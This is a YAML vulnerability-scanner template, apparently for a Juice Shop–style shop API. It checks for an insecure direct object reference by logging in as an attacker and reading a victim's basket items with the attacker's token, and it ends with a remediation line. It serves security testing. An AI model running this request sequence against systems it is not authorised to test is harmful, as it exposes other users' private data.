id: basket-items-idor
info:
  name: Basket Items IDOR Vulnerability
  description: Detects IDOR on basket item enumeration
  tags:
    - idor
    - access-control

variables:
  attacker_email: "{{ATTACKER_EMAIL}}"
  attacker_password: "{{ATTACKER_PASSWORD}}"
  victim_email: "{{VICTIM_EMAIL}}"
  victim_password: "{{VICTIM_PASSWORD}}"

requests:
  - name: Attacker login
    method: POST
    path: /rest/user/login
    headers:
      Content-Type: application/json
    body: '{"email": "{{attacker_email}}", "password": "{{attacker_password}}"}'
    extractors:
      - type: json
        name: attacker_token
        selector: "$.authentication.token"
      - type: json
        name: attacker_basket_id
        selector: "$.bid"

  - name: Victim login
    method: POST
    path: /rest/user/login
    headers:
      Content-Type: application/json
    body: '{"email": "{{victim_email}}", "password": "{{victim_password}}"}'
    extractors:
      - type: json
        name: victim_basket_id
        selector: "$.bid"

  - name: Enumerate basket items by ID
    method: GET
    path: /api/BasketItems/{{victim_basket_id}}
    headers:
      Authorization: "Bearer {{attacker_token}}"
    matchers:
      - type: status
        values: [200]
      - type: word
        words: ["BasketItem", "basketId"]
        condition: and
    on_match:
      vulnerability: INSECURE_DIRECT_OBJECT_REFERENCE
      message: Can enumerate victims basket items
      remediation: Implement proper ownership checks on basket item access
